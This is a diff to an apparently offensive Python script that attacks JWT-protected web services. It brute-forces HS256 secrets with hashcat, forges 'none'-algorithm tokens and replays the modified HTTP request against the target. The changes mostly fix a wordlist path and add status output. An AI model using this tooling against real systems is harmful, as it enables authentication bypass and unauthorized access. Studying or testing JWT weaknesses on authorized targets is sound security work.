@@ -13,7 +13,16 @@ YELLOW = "\033[33m"
 BLUE = "\033[34m"
 CYAN = "\033[36m"
 RESET = "\033[0m"
+
+
+## varaibles
 jwtRegex = r"\*ey.*?\*"
+OriginalResponse = ''
+OriginalStatusCode = ''
+AttackResponse = ''
+AttackResponse = ''
+AttackStatusCode = ''
+
 
 
 def displayHeader(header):
@@ -28,20 +37,18 @@ def bruteforce(token, algorithm):
         pass
 
     elif algorithm == 'HS256':
-        # Step 1: Run hashcat
         cmd = [
             "hashcat",
             "-a", "0",
             "-m", "16500",
             token,
-            "./jwtCommanlist/",
+            "./jwtCommonlist/",
             "--quiet"
         ]
 
         try:
             subprocess.run(cmd, capture_output=True, text=True)
 
-            # Step 2: Show cracked result
             show_cmd = [
                 "hashcat",
                 "-m", "16500",
@@ -72,6 +79,7 @@ def getRequestFromFile(httpRequestFile):
         return content     
 
 
+## Build http request
 def buildRequest(rawRequest):
     parts = re.split(r"\r?\n\r?\n", rawRequest, maxsplit=1)
     head = parts[0]
@@ -100,10 +108,10 @@ def buildRequest(rawRequest):
     url = f"https://{host}{path}"
 
     # Send request
+    print(f"[+] Sending HTTP request at {url} ....")
     response = requests.request(method=method, url=url, headers=headers, data=body)
-
-    print(response.status_code)
-
+    print(f'Server responsded - status code : {GREEN}{response.status_code}{RESET} and Content Length : {GREEN}{len(response.content)}{RESET}')
+    return response.status_code, response.content
 
 def noneAlgattack(token):
     parts = token.split('.')
@@ -143,7 +151,6 @@ def main():
         algorithm = header.get('alg')
 
         noneToken = noneAlgattack(token)
-        print(noneToken)
         tempRequest = re.sub(jwtRegex,f'{noneToken}', rawRequest, count=1)
         buildRequest(tempRequest)
 
